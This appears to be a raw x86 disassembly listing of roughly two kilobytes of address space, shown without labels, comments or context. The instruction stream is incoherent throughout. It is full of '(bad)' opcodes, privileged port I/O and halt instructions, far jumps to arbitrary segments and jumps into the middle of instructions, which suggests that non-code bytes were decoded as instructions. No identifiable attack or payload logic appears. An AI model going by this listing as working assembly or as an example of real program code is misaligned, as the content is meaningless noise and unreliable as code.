  41ff8b:	inc    esi
  41ff8c:	je     0x41ffdb
  41ff8e:	fcomp  QWORD PTR [ebx*8-0x7bc434ef]
  41ff95:	dec    esp
  41ff96:	mov    eax,0x405650ee
  41ff9b:	sbb    DWORD PTR [esi+0x9],ebp
  41ff9e:	cdq    
  41ff9f:	call   0x2660cea8
  41ffa4:	cli    
  41ffa5:	fld    TBYTE PTR [ebx+ecx*2+0x7350a239]
  41ffac:	mov    ecx,0xdc6c3c93
  41ffb1:	test   eax,0x708f7aaf
  41ffb6:	cmp    al,0xce
  41ffb8:	add    DWORD PTR [eax-0x4a],ecx
  41ffbb:	push   esi
  41ffbc:	je     0x41ff8a
  41ffbe:	jbe    0x41ffc4
  41ffc0:	lods   al,BYTE PTR ds:[esi]
  41ffc1:	adc    al,0x17
  41ffc3:	sub    eax,0x45b696b3
  41ffc8:	rcl    DWORD PTR [ebx-0x33],cl
  41ffcb:	pushf  
  41ffcc:	pushf  
  41ffcd:	inc    ebx
  41ffce:	fidiv  DWORD PTR [ebx-0x717c9fa8]
  41ffd4:	pop    es
  41ffd5:	std    
  41ffd6:	or     dl,ch
  41ffd8:	jmp    0x41ffc0
  41ffda:	and    ecx,esp
  41ffdc:	adc    al,0xe8
  41ffde:	ins    BYTE PTR es:[edi],dx
  41ffdf:	mov    WORD PTR [esi],cs
  41ffe1:	pop    ds
  41ffe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffe3:	mov    dh,0x40
  41ffe5:	pop    edx
  41ffe6:	sub    eax,0x5606b284
  41ffeb:	mov    dh,cl
  41ffed:	adc    DWORD PTR [ecx+edx*2-0x4bd3f265],edx
  41fff4:	jge    0x41ffe5
  41fff6:	add    dl,BYTE PTR [edx+esi*1-0x3f]
  41fffa:	push   0xffffffc9
  41fffc:	(bad)  
  41fffd:	arpl   WORD PTR [esi-0x78757eb5],bp
  420003:	nop
  420004:	leave  
  420005:	xchg   edi,eax
  420006:	bound  eax,QWORD PTR [esi]
  420008:	sub    al,0x26
  42000a:	cmc    
  42000b:	xchg   ebx,eax
  42000c:	push   ecx
  42000d:	popf   
  42000e:	jl     0x420043
  420010:	retf   
  420011:	dec    ebx
  420013:	and    bh,BYTE PTR [eax+0x3c1a7b3a]
  420019:	dec    ebx
  42001a:	scas   eax,DWORD PTR es:[edi]
  42001b:	bound  edi,QWORD PTR [ecx+0x25]
  42001e:	retf   0x3b7
  420021:	sub    ch,BYTE PTR [ecx+eiz*1]
  420024:	xchg   ebp,eax
  420025:	scas   eax,DWORD PTR es:[edi]
  420026:	xchg   esp,eax
  420027:	sar    ebx,1
  420029:	push   ss
  42002a:	rcr    DWORD PTR [edx-0x6616441a],0x69
  420031:	(bad)  
  420032:	into   
  420033:	mov    eax,0xc1f1bd6e
  420038:	and    BYTE PTR [eax-0x397243c0],bl
  42003e:	or     DWORD PTR [ecx-0x1df72ff9],0x5b757b3
  420048:	retf   
  420049:	and    BYTE PTR [esi],bh
  42004b:	dec    eax
  42004c:	xchg   edx,eax
  42004d:	fstp   QWORD PTR [esi+0x42]
  420050:	sahf   
  420051:	push   ecx
  420052:	dec    esi
  420053:	sbb    BYTE PTR [edx],cl
  420055:	xor    eax,0x8500bf88
  42005a:	cs xor ch,bh
  42005d:	mov    ch,0x99
  42005f:	sbb    DWORD PTR [ebx-0x62743fa],esp
  420065:	sub    eax,0x95839399
  42006a:	or     BYTE PTR [edi-0x6f],bh
  42006d:	ins    BYTE PTR es:[edi],dx
  42006e:	scas   al,BYTE PTR es:[edi]
  42006f:	pop    esp
  420070:	xchg   ebp,eax
  420071:	sub    al,0x60
  420073:	and    esi,DWORD PTR [ebx+0x1a0b1014]
  420079:	and    edi,eax
  42007b:	clc    
  42007c:	ret    0x6124
  42007f:	jmp    0x712f:0xf7bfcfea
  420086:	xor    bl,BYTE PTR ds:0x3157b14
  42008c:	ss or  al,bh
  42008f:	push   cs
  420090:	mov    ds:0xca55fc0f,eax
  420095:	sub    edi,ecx
  420097:	pop    eax
  420098:	cwde   
  420099:	idiv   BYTE PTR [esi-0x4c972d37]
  42009f:	scas   al,BYTE PTR es:[edi]
  4200a0:	retf   
  4200a1:	dec    edi
  4200a2:	pop    edi
  4200a3:	inc    esi
  4200a4:	push   ecx
  4200a5:	stc    
  4200a6:	dec    esi
  4200a7:	adc    BYTE PTR [esi+ebp*4+0x28738d75],cl
  4200ae:	hlt    
  4200af:	jae    0x42012a
  4200b1:	mov    ebp,0xcd9329c6
  4200b6:	ret    
  4200b7:	or     eax,0x2dcdebd
  4200bc:	mov    ebp,0x576931e9
  4200c1:	add    BYTE PTR es:[edi+0x2c],0xa2
  4200c6:	mov    cl,0xe
  4200c8:	jl     0x4200ab
  4200ca:	xchg   edi,eax
  4200cb:	pushf  
  4200cc:	cld    
  4200cd:	call   0xe8950312
  4200d2:	nop
  4200d3:	outs   dx,BYTE PTR ds:[esi]
  4200d4:	xchg   ebx,eax
  4200d5:	sub    al,0x3d
  4200d7:	push   ebp
  4200d8:	mov    ah,0xa8
  4200da:	scas   eax,DWORD PTR es:[edi]
  4200db:	inc    esi
  4200dc:	int3   
  4200dd:	inc    ecx
  4200de:	ja     0x420151
  4200e0:	mov    cl,0x18
  4200e2:	cmp    al,0xc6
  4200e4:	pop    esp
  4200e5:	cs mov al,ch
  4200e8:	mov    esi,ds
  4200ea:	je     0x42006e
  4200ec:	xchg   esp,eax
  4200ed:	jne    0x420136
  4200ef:	sbb    bl,dh
  4200f1:	xchg   ebp,eax
  4200f2:	mov    dh,0x69
  4200f4:	loope  0x4200e4
  4200f6:	or     ebx,DWORD PTR [edx]
  4200f8:	sub    cl,ch
  4200fa:	sub    BYTE PTR [esi],0x89
  4200fd:	add    ecx,ebp
  4200ff:	(bad)  
  420100:	icebp  
  420101:	data16 fwait
  420103:	test   ecx,eax
  420105:	sbb    al,0xc5
  420107:	pop    edi
  420108:	repnz sbb dl,BYTE PTR [edx-0x13]
  42010c:	sub    esi,ecx
  42010e:	fidiv  WORD PTR [ecx]
  420110:	lea    edi,[esi]
  420112:	jno    0x42017f
  420114:	pop    eax
  420115:	call   0x568c:0xd6282e26
  42011c:	push   ss
  42011d:	ss mov al,0x36
  420120:	or     al,0x65
  420122:	outs   dx,BYTE PTR ds:[esi]
  420123:	push   ss
  420124:	(bad)  
  420125:	sbb    edi,edi
  420127:	push   edx
  420128:	mov    dh,0xab
  42012a:	push   edi
  42012b:	or     eax,0x382785a3
  420130:	fadd   QWORD PTR [ecx+0x348c7a03]
  420136:	je     0x4200ed
  420138:	mov    ecx,0x7e9c68f7
  42013d:	imul   edx,DWORD PTR [edx],0x60484a2e
  420143:	fnstsw WORD PTR [esi+ecx*1]
  420146:	dec    edx
  420147:	lock xchg ebp,eax
  420149:	enter  0xd3ed,0xc
  42014d:	xchg   ecx,eax
  42014e:	mov    esp,0xa053874
  420153:	jns    0x42016a
  420155:	xchg   esi,eax
  420156:	mov    ah,0x30
  420158:	fist   DWORD PTR [ecx]
  42015b:	inc    edi
  42015c:	int    0xcd
  42015e:	dec    edi
  42015f:	lds    edx,FWORD PTR [esi+0x7d]
  420162:	sbb    al,BYTE PTR [edi-0x4ec20fd6]
  420168:	ss scas al,BYTE PTR es:[edi]
  42016a:	out    dx,al
  42016b:	xor    al,0x92
  42016d:	js     0x42016b
  42016f:	jge    0x4200f8
  420171:	jnp    0x42011b
  420173:	jnp    0x4201aa
  420175:	clc    
  420176:	xor    edi,DWORD PTR ds:0xec7e0d8a
  42017c:	cmp    al,BYTE PTR [ebx+ebx*2-0x351496f8]
  420183:	mov    dl,ch
  420185:	jmp    0x5759:0x191a
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx-0x80],esi
  420197:	stc    
  420198:	mov    ebx,0x190e23d
  42019d:	add    BYTE PTR [esi-0x17fffffa],al
  4201a3:	bound  esi,QWORD PTR [edx+0x1c]
  4201a6:	fistp  QWORD PTR [edx+eax*1-0x44]
  4201aa:	push   ss
  4201ab:	mov    dl,cl
  4201ad:	jne    0x4201fa
  4201af:	add    DWORD PTR [esi-0x61],esi
  4201b2:	scas   al,BYTE PTR es:[edi]
  4201b3:	sub    dh,BYTE PTR [edx-0x2a]
  4201b6:	inc    ebx
  4201b7:	(bad)  
  4201b8:	ins    DWORD PTR es:[edi],dx
  4201b9:	ins    BYTE PTR es:[edi],dx
  4201ba:	imul   eax,DWORD PTR ds:0x95a7fb8b,0xffffffe8
  4201c1:	xor    ah,BYTE PTR [ecx-0x373a24e7]
  4201c7:	pop    ds
  4201c8:	push   cs
  4201c9:	add    bh,al
  4201cb:	(bad)  
  4201cc:	std    
  4201cd:	out    0x1a,al
  4201cf:	retf   
  4201d0:	cdq    
  4201d1:	fld    DWORD PTR [eax-0x8]
  4201d4:	jbe    0x42020a
  4201d6:	push   edx
  4201d7:	sub    ah,BYTE PTR [ecx-0x657577e8]
  4201dd:	cld    
  4201de:	cmp    DWORD PTR [eax-0xc],edx
  4201e1:	push   ecx
  4201e2:	bnd jmp 0x8a12a371
  4201e8:	add    BYTE PTR ds:0x8e09046c,ah
  4201ee:	dec    esp
  4201ef:	push   eax
  4201f0:	adc    al,0x6
  4201f2:	xchg   DWORD PTR [edx],ebp
  4201f4:	xor    bl,BYTE PTR [eax]
  4201f6:	imul   eax,DWORD PTR [esi-0x40],0x16b22595
  4201fd:	pushf  
  4201fe:	repz cmp al,BYTE PTR [esi+0x2d41c3d6]
  420205:	popf   
  420206:	dec    ebx
  420207:	and    al,0x7d
  420209:	retf   
  42020a:	shl    DWORD PTR [ebp-0x5c],0xff
  42020e:	in     eax,0xe2
  420210:	jmp    0x7676f27
  420215:	(bad)  
  420216:	fst    DWORD PTR ds:0x201982eb
  42021c:	mov    dh,0x8e
  42021e:	sbb    al,0x37
  420220:	sbb    bh,BYTE PTR [ecx+0x5a]
  420223:	ins    BYTE PTR es:[edi],dx
  420224:	enter  0xc686,0x30
  420228:	mov    ebp,0x369409b1
  42022d:	mov    al,ds:0x726fab9c
  420232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420233:	pop    ebp
  420234:	loopne 0x4202b1
  420236:	mov    bh,0x88
  420238:	add    BYTE PTR [ebp-0x5],cl
  42023b:	or     eax,0xc9eb13a9
  420240:	cwde   
  420241:	(bad)  
  420242:	shl    BYTE PTR [ebx-0x25],cl
  420245:	cmp    eax,DWORD PTR [ecx+0xc39ab7b]
  42024b:	push   0xf1adaf4d
  420250:	push   ss
  420251:	sub    bl,BYTE PTR [ecx+0x58]
  420254:	adc    edx,ecx
  420256:	jo     0x420210
  420258:	(bad)  
  420259:	popa   
  42025a:	mov    ds:0xe1a3ad96,eax
  42025f:	add    ebp,ecx
  420261:	in     eax,dx
  420262:	ror    BYTE PTR ds:0x25e4f7df,cl
  420268:	sub    edx,esp
  42026a:	cld    
  42026b:	scas   eax,DWORD PTR es:[edi]
  42026c:	stos   BYTE PTR es:[edi],al
  42026d:	xor    eax,0x49371a7f
  420272:	sbb    DWORD PTR [ecx-0x3ebfadca],ecx
  420278:	(bad)  
  420279:	int    0x8b
  42027b:	sub    ebp,DWORD PTR [ebx]
  42027d:	lds    esi,FWORD PTR [ebp+0x6feedd00]
  420283:	popa   
  420284:	leave  
  420285:	pop    ss
  420286:	mov    dl,0x92
  420288:	fild   WORD PTR [ecx+0x2952a63d]
  42028e:	inc    esp
  42028f:	sbb    esp,ecx
  420291:	jne    0x4202a6
  420293:	repnz sbb bh,BYTE PTR [ebx]
  420296:	jo     0x420280
  420298:	cli    
  420299:	in     al,dx
  42029a:	(bad)  
  42029b:	in     eax,dx
  42029c:	inc    ebx
  42029d:	sbb    BYTE PTR [ebx-0x4a],dl
  4202a0:	jnp    0x42028d
  4202a2:	push   0xe
  4202a4:	inc    ebp
  4202a5:	add    eax,DWORD PTR [eax]
  4202a7:	inc    edx
  4202a8:	push   es
  4202a9:	or     eax,0xe9fac985
  4202ae:	(bad)  
  4202af:	idiv   BYTE PTR [eax+0x50]
  4202b2:	std    
  4202b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202b4:	pop    es
  4202b5:	xchg   ebx,eax
  4202b6:	pop    edx
  4202b7:	pop    esi
  4202b8:	outs   dx,DWORD PTR ds:[esi]
  4202b9:	pushf  
  4202ba:	pop    ebp
  4202bb:	inc    ecx
  4202bc:	push   ebx
  4202bd:	imul   ecx,DWORD PTR [edx-0x7c],0xffffffa5
  4202c1:	lods   eax,DWORD PTR ds:[esi]
  4202c2:	fldenv [edx-0x55a934c6]
  4202c8:	jno    0x420316
  4202ca:	jmp    0x42029b
  4202cc:	xlat   BYTE PTR ds:[ebx]
  4202cd:	mov    edi,0x27700211
  4202d2:	mov    dh,0xad
  4202d4:	pop    esi
  4202d5:	aad    0x4c
  4202d7:	ficomp WORD PTR [edi+0x3a]
  4202da:	ret    0xbc08
  4202dd:	push   0xeada74e9
  4202e2:	fidivr DWORD PTR [edi-0x6d]
  4202e5:	rcr    DWORD PTR [ecx+0x7b],0x5
  4202e9:	ins    DWORD PTR es:[edi],dx
  4202ea:	dec    esp
  4202eb:	push   ecx
  4202ec:	hlt    
  4202ed:	(bad)  
  4202ee:	mov    dl,0xeb
  4202f0:	mov    eax,ds:0x5619ed42
  4202f5:	push   es
  4202f6:	fisubr WORD PTR [ebx]
  4202f8:	aam    0x2b
  4202fa:	dec    ebp
  4202fb:	and    al,0x7c
  4202fd:	(bad)  
  4202fe:	sub    ch,ah
  420300:	rol    edi,0x66
  420303:	jg     0x420342
  420305:	out    dx,eax
  420306:	adc    ebx,ebp
  420308:	sub    ebp,DWORD PTR [eax-0x66]
  42030b:	sbb    ch,BYTE PTR [edi+esi*8-0x7d3b458]
  420312:	mov    ch,0xd3
  420314:	push   edx
  420315:	hlt    
  420316:	lar    ebp,WORD PTR [esi+0x182ee925]
  42031d:	fstp   DWORD PTR [esi-0x287b87d3]
  420323:	and    eax,0x8423e54f
  420328:	xlat   BYTE PTR ds:[ebx]
  420329:	cmp    eax,0xdfa6ae01
  42032e:	jbe    0x420316
  420330:	push   es
  420331:	add    DWORD PTR [edi+ecx*2+0x5dd7a5cb],0x5e125c8d
  42033c:	sti    
  42033d:	jns    0x420365
  42033f:	xor    cl,BYTE PTR [esi-0x7fb3d570]
  420345:	adc    esp,DWORD PTR [ebp+0x5061c8ba]
  42034b:	fxch   st(0)
  42034d:	jle    0x4202df
  42034f:	inc    ebp
  420350:	jmp    0xddc1c61f
  420355:	sub    al,0xe9
  420357:	inc    ecx
  420358:	add    ch,BYTE PTR [eax-0x36deebbb]
  42035e:	cmp    ebx,ebx
  420360:	ss xchg edx,eax
  420362:	jmp    0x79668a41
  420367:	les    edi,FWORD PTR [eax]
  420369:	scas   al,BYTE PTR es:[edi]
  42036a:	mov    esi,0xd7bb4739
  42036f:	pop    ebx
  420370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420371:	jns    0x4203c7
  420373:	inc    eax
  420374:	jmp    0xdf4de2bb
  420379:	mov    ebp,0xa642f7b9
  42037e:	mov    esp,0x1acc4c87
  420383:	mov    eax,edi
  420385:	gs inc edx
  420387:	or     ah,BYTE PTR [ecx+0x5fdd659b]
  42038d:	clc    
  42038e:	push   es
  42038f:	push   0x30
  420391:	loope  0x4203fc
  420393:	out    0x11,al
  420395:	pop    edx
  420396:	xchg   ecx,eax
  420397:	add    al,0xc
  420399:	jmp    0x269:0x9f92e48f
  4203a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203a1:	lds    edx,FWORD PTR [edx]
  4203a3:	(bad)  
  4203a5:	adc    BYTE PTR [edi],ah
  4203a7:	add    ebp,DWORD PTR ds:0x820b8332
  4203ad:	sahf   
  4203ae:	adc    bl,bl
  4203b0:	sub    dh,BYTE PTR [esi+0x4e]
  4203b3:	or     DWORD PTR [edx-0x182fdf6d],0x4ee88dd6
  4203bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203be:	sub    ebx,DWORD PTR [edi+0x792cad3c]
  4203c4:	ins    DWORD PTR es:[edi],dx
  4203c5:	hlt    
  4203c6:	(bad)  
  4203c7:	cmp    ah,ah
  4203c9:	addr16 (bad) 
  4203cb:	xor    edx,esp
  4203cd:	adc    ebp,0xffffffbb
  4203d0:	aam    0x32
  4203d2:	int    0x99
  4203d4:	add    ecx,ebx
  4203d6:	cmp    esp,DWORD PTR [ecx+0x4153a1f6]
  4203dc:	aaa    
  4203dd:	scas   al,BYTE PTR es:[edi]
  4203de:	push   edx
  4203df:	jp     0x4203ba
  4203e1:	add    DWORD PTR [ecx+0x60de652d],0x1a
  4203e8:	jns    0x42036c
  4203ea:	aad    0xd8
  4203ec:	inc    eax
  4203ed:	lods   eax,DWORD PTR ds:[esi]
  4203ee:	or     ch,BYTE PTR [edi-0x19]
  4203f1:	aad    0x0
  4203f3:	mov    esp,0xde835fc6
  4203f8:	or     al,0x2b
  4203fa:	enter  0xa02e,0x9a
  4203fe:	push   0xe90f19fa
  420403:	push   ecx
  420404:	xchg   ebp,eax
  420405:	pushf  
  420406:	scas   eax,DWORD PTR es:[edi]
  420407:	(bad)  
  420408:	in     al,dx
  420409:	or     dh,ch
  42040b:	(bad)  
  42040c:	fdiv   st(7),st
  42040e:	test   al,0xbd
  420410:	and    cl,BYTE PTR [ebp*8-0x31af7491]
  420417:	rcl    ch,cl
  420419:	xchg   DWORD PTR [ebx-0x5e],eax
  42041c:	aad    0x4f
  42041e:	or     eax,0xac36426a
  420423:	xlat   BYTE PTR ds:[ebx]
  420424:	mov    BYTE PTR [ebx+0x2441c6dc],dl
  42042a:	dec    DWORD PTR [eax-0x66]
  42042d:	mov    cl,BYTE PTR [edi-0x3f955976]
  420433:	enter  0x5e1b,0x4f
  420437:	push   esp
  420438:	and    eax,0x97ead465
  42043d:	je     0x420401
  42043f:	dec    ebx
  420440:	outs   dx,BYTE PTR ds:[esi]
  420441:	js     0x42048c
  420443:	cmp    DWORD PTR [edi],ebx
  420445:	pop    ebp
  420446:	out    dx,al
  420447:	and    al,0xb6
  420449:	mov    dh,BYTE PTR [ecx]
  42044b:	pop    eax
  42044c:	mov    cl,0x31
  42044e:	push   ebp
  42044f:	aas    
  420450:	cs aaa 
  420452:	aaa    
  420453:	(bad)  
  420454:	jmp    DWORD PTR [esi-0x2d]
  420457:	mov    ah,0x88
  420459:	call   0x5f9a:0x273fe809
  420460:	fcmove st,st(1)
  420462:	xlat   BYTE PTR ds:[ebx]
  420463:	pop    edi
  420464:	adc    bh,BYTE PTR [edx+0x23]
  420467:	xchg   ebx,eax
  420468:	and    ch,0xd4
  42046b:	aad    0xd2
  42046d:	fisubr WORD PTR [esi]
  42046f:	or     ch,ch
  420471:	aad    0x18
  420473:	jmp    0x9b84:0xa531663c
  42047a:	cmp    eax,0x76ac55cb
  42047f:	mov    eax,ds:0xc369a854
  420484:	mov    bh,0x3d
  420486:	xchg   edi,eax
  420487:	add    al,0x80
  420489:	inc    ecx
  42048a:	icebp  
  42048b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42048c:	jne    0x420457
  42048e:	enter  0x23a8,0x91
  420492:	cmp    esi,DWORD PTR ds:0xe776055d
  420498:	dec    ebp
  420499:	aam    0x3
  42049b:	inc    ecx
  42049c:	adc    BYTE PTR [edi],ch
  42049e:	and    cl,BYTE PTR [esi-0x38030d82]
  4204a4:	inc    ecx
  4204a5:	sub    al,0xbc
  4204a7:	jmp    DWORD PTR [eax+0x6a6cfbe8]
  4204ad:	hlt    
  4204ae:	call   0x4e87e354
  4204b3:	outs   dx,BYTE PTR ds:[esi]
  4204b4:	xor    dh,BYTE PTR [eax+edi*4+0x76]
  4204b8:	ins    DWORD PTR es:[edi],dx
  4204b9:	push   0xffffff91
  4204bb:	cmp    eax,0xd84fae7e
  4204c0:	jmp    0x681d:0xc936a3b7
  4204c7:	xlat   BYTE PTR ds:[ebx]
  4204c8:	sub    esp,edx
  4204ca:	repz test eax,0x4ae0e40e
  4204d0:	aas    
  4204d1:	(bad)  
  4204d2:	cmp    ecx,DWORD PTR [esp+ebp*4]
  4204d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204d6:	xchg   BYTE PTR [edx+0x7d],al
  4204d9:	imul   eax,DWORD PTR [edi],0x2267444f
  4204df:	outs   dx,BYTE PTR ds:[esi]
  4204e0:	mov    BYTE PTR [ecx+ebp*4-0x48],al
  4204e4:	push   ebx
  4204e5:	mov    ecx,0xbdbc3828
  4204ea:	jo     0x420561
  4204ec:	test   eax,0xe0f4166f
  4204f1:	jb     0x4204b6
  4204f3:	mov    DWORD PTR [ebx-0x71],0xd555c610
  4204fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204fb:	popa   
  4204fc:	cmc    
  4204fd:	push   edi
  4204fe:	in     al,dx
  4204ff:	js     0x4204d0
  420501:	repnz shl BYTE PTR [ecx],cl
  420504:	mov    ch,BYTE PTR [eax+0x3836a252]
  42050a:	xor    al,0x1e
  42050c:	dec    edi
  42050d:	int    0xe
  42050f:	inc    esp
  420510:	dec    esi
  420511:	mov    al,0x14
  420513:	test   al,0x63
  420515:	test   DWORD PTR ss:[edi-0x38a1dc2e],ebp
  42051c:	xchg   ecx,eax
  42051d:	imul   ecx,DWORD PTR [eax-0x28],0xfffffffb
  420521:	das    
  420522:	ja     0x4204e7
  420524:	pop    ds
  420525:	int    0x37
  420527:	imul   ecx,DWORD PTR [edx+0x7e20ffc8],0xeb15eafc
  420531:	ins    BYTE PTR es:[edi],dx
  420532:	xchg   DWORD PTR [ebp+0x4d4b1826],ebp
  420538:	push   ss
  420539:	test   DWORD PTR [ecx+0x56e5d668],edi
  42053f:	dec    ebp
  420540:	dec    edx
  420541:	int3   
  420542:	add    DWORD PTR [eax+0x3f93ac9],edx
  420548:	adc    esi,DWORD PTR [eax+ebx*1+0x1]
  42054c:	sbb    BYTE PTR [edx],dl
  42054e:	mov    eax,ds:0xe1ce273f
  420553:	sbb    DWORD PTR [esi+eiz*4-0x38],ebp
  420557:	bound  ebp,QWORD PTR [edi+ebx*4+0x10]
  42055b:	jmp    0x2cfd:0x7f6e
  420561:	sub    DWORD PTR [eax+esi*2],esi
  420564:	js     0x42057e
  420566:	mov    BYTE PTR [ebx-0x1d252f1],ah
  42056c:	xchg   esi,eax
  42056d:	fistp  DWORD PTR [eax+0x14]
  420570:	adc    ecx,edi
  420572:	out    dx,al
  420573:	xchg   ebx,eax
  420574:	loope  0x420563
  420576:	loope  0x4205cd
  420578:	sahf   
  420579:	fwait
  42057a:	and    eax,ebp
  42057c:	mov    ds,WORD PTR [esi-0x21]
  42057f:	imul   esp,eax,0xcdf81bf2
  420585:	sub    ebx,edi
  420587:	push   ds
  420588:	nop
  420589:	jne    0x4205db
  42058b:	sbb    eax,0x7b707a7e
  420590:	and    eax,0x3492437d
  420595:	(bad)  
  420596:	pop    edi
  420597:	fsubr  st,st(7)
  420599:	xchg   esp,eax
  42059a:	popf   
  42059b:	pop    ecx
  42059c:	cld    
  42059d:	lahf   
  42059e:	stc    
  42059f:	sbb    bh,BYTE PTR [eax]
  4205a1:	adc    DWORD PTR [edx-0x7fb23d4a],0x14
  4205a8:	js     0x42053b
  4205aa:	pop    edx
  4205ab:	adc    al,0xb0
  4205ad:	cmp    BYTE PTR [ebx],al
  4205af:	(bad)  
  4205b0:	jmp    0x5516:0x51ddf42e
  4205b7:	sub    al,0xde
  4205b9:	jne    0x42056f
  4205bb:	mul    BYTE PTR [esi]
  4205bd:	mov    ah,bl
  4205bf:	call   0xa3ae27c9
  4205c4:	add    dh,BYTE PTR [ecx-0x7f]
  4205c7:	dec    edx
  4205c8:	mov    al,0x81
  4205ca:	mov    ah,0xe6
  4205cc:	xor    edx,DWORD PTR [eax]
  4205ce:	outs   dx,BYTE PTR ds:[esi]
  4205cf:	or     DWORD PTR [esi+0x57],esi
  4205d2:	or     cl,ch
  4205d4:	ror    BYTE PTR [edi],0x6a
  4205d7:	xchg   esp,eax
  4205d8:	fnstsw WORD PTR [eax-0x64eeff52]
  4205de:	cli    
  4205df:	arpl   di,sp
  4205e1:	ins    DWORD PTR es:[edi],dx
  4205e2:	mov    ds:0x1013d6da,al
  4205e7:	(bad)  
  4205e8:	jb     0x4205b7
  4205ea:	lds    ebx,FWORD PTR [esi-0x15cc9b05]
  4205f0:	or     DWORD PTR [esi-0x6ddafb53],edi
  4205f6:	out    dx,al
  4205f7:	mov    ah,0x50
  4205f9:	jns    0x42060b
  4205fb:	and    ebx,ecx
  4205fd:	fisttp WORD PTR [esi-0x14c9816b]
  420603:	repnz aaa 
  420605:	daa    
  420606:	fsub   QWORD PTR [esi-0x15]
  420609:	pop    ds
  42060a:	dec    eax
  42060b:	push   es
  42060c:	lods   al,BYTE PTR ds:[esi]
  42060d:	stos   DWORD PTR es:[edi],eax
  42060e:	inc    ebp
  42060f:	pop    edx
  420610:	sub    BYTE PTR [edi+0x42],0x9e
  420614:	xchg   ebx,eax
  420615:	mov    bl,0x40
  420617:	pop    ds
  420618:	repz or bh,bh
  42061b:	int    0x48
  42061d:	retf   0x55d
  420620:	push   es
  420621:	pop    edi
  420622:	sahf   
  420623:	enter  0x8835,0xb1
  420627:	mov    dh,0x4d
  420629:	jb     0x42064a
  42062b:	add    DWORD PTR [edx+0x56518e25],edi
  420631:	push   cs
  420632:	inc    edi
  420633:	or     BYTE PTR [ebx],0x7c
  420636:	pusha  
  420637:	out    0x87,al
  420639:	jl     0x42060d
  42063b:	or     al,0x37
  42063d:	sahf   
  42063e:	aaa    
  42063f:	rcr    BYTE PTR [ebx-0x6c88136b],0x38
  420646:	xchg   ebp,eax
  420647:	or     eax,0x560f319
  42064c:	stc    
  42064d:	lahf   
  42064e:	xor    al,0xdf
  420650:	iret   
  420651:	jmp    0xac9:0xcb53eb9f
  420658:	dec    edi
  420659:	call   0xfd22f7aa
  42065e:	sahf   
  42065f:	repnz div BYTE PTR [edx-0x7dcfb27]
  420666:	in     al,dx
  420667:	push   0xffffff92
  420669:	pop    edx
  42066a:	rcr    DWORD PTR [ecx],cl
  42066c:	inc    ecx
  42066e:	fcmove st,st(2)
  420670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420671:	jno    0x4206b8
  420673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420674:	adc    eax,0x5fd019bd
  420679:	pop    es
  42067a:	push   ds
  42067b:	les    ecx,FWORD PTR [ecx+eiz*8+0x7dad05e]
  420682:	xlat   BYTE PTR ds:[ebx]
  420683:	shr    DWORD PTR [edi+0x5e],0x78
  420687:	rcl    DWORD PTR [edi],1
  420689:	add    DWORD PTR [edx-0x16cba36d],0x7d
  420690:	shr    DWORD PTR [edi+0xd],0xd2
  420694:	jo     0x42070e
  420696:	inc    eax
  420697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420698:	ficom  WORD PTR [ebx]
  42069a:	adc    ebp,ebx
  42069c:	test   DWORD PTR [ebx+0x68],0x77a7b60f
  4206a3:	pushf  
  4206a4:	jle    0x4206c6
  4206a6:	sti    
  4206a7:	sbb    BYTE PTR [esi-0x12],ah
  4206aa:	add    bh,BYTE PTR [edx]
  4206ac:	mov    ebp,0x9bb1a443
  4206b1:	inc    esp
  4206b2:	sub    ah,al
  4206b4:	(bad)  
  4206b5:	mul    BYTE PTR [esi+0x6c40b98b]
  4206bb:	inc    edx
  4206bc:	mov    al,0x82
  4206be:	mov    ds:0xb68db30b,al
  4206c3:	adc    BYTE PTR [esi+0x299d42a9],ch
  4206c9:	cmp    al,0xf8
  4206cb:	and    edx,ecx
  4206cd:	aam    0x7
  4206cf:	xor    cl,BYTE PTR [ecx-0x3f]
  4206d2:	push   ebp
  4206d3:	fs xor al,0x47
  4206d6:	push   ebx
  4206d7:	cs test eax,0xa4f38dc
  4206dd:	dec    edx
  4206de:	xlat   BYTE PTR ds:[ebx]
  4206df:	test   DWORD PTR [esi-0x30d36f72],edx
  4206e5:	jo     0x42070a
  4206e7:	push   ebp
  4206e8:	add    al,0xd5
  4206ea:	arpl   dx,bx
  4206ec:	push   edx
  4206ed:	mov    ebp,0xafc3e151
  4206f2:	mov    esi,0x49e12d80
  4206f7:	push   edi
  4206f8:	sbb    al,0x69
  4206fa:	xlat   BYTE PTR ds:[ebx]
  4206fb:	ret    0x4f3e
  4206fe:	xor    eax,0x1e37b63b
  420703:	jge    0x4206ce
  420705:	sbb    al,bh
  420707:	(bad)  
  420708:	cmp    bh,BYTE PTR [eax+0x354c226f]
  42070e:	xchg   DWORD PTR [edi-0x3e],esp
  420711:	mov    ebp,0xee22a7eb
  420716:	loop   0x42070e
  420718:	mov    ebp,0x885b3c6
  42071d:	shl    DWORD PTR [ecx],cl
  42071f:	xchg   esp,eax
  420720:	mov    esp,DWORD PTR [edx]
  420722:	mov    al,ds:0x44e22747
  420727:	add    ebp,esi
  420729:	push   ds
  42072a:	je     0x42079b
  42072c:	(bad)  
  42072d:	jge    0x420774
  42072f:	outs   dx,BYTE PTR ds:[esi]
  420730:	bound  eax,QWORD PTR [ebx]
  420732:	or     ecx,ebx
  420734:	adc    esp,DWORD PTR [esi-0x7bedcc76]
  42073a:	dec    ebp
  42073b:	add    ebx,ecx
  42073d:	out    dx,eax
  42073e:	lahf   
  42073f:	outs   dx,BYTE PTR ds:[esi]
  420740:	push   esp
  420741:	loopne 0x4206f5
  420743:	ret    
  420744:	sbb    ecx,DWORD PTR [ebx+0xc847c30]
  42074a:	adc    DWORD PTR [ecx-0x68],esi
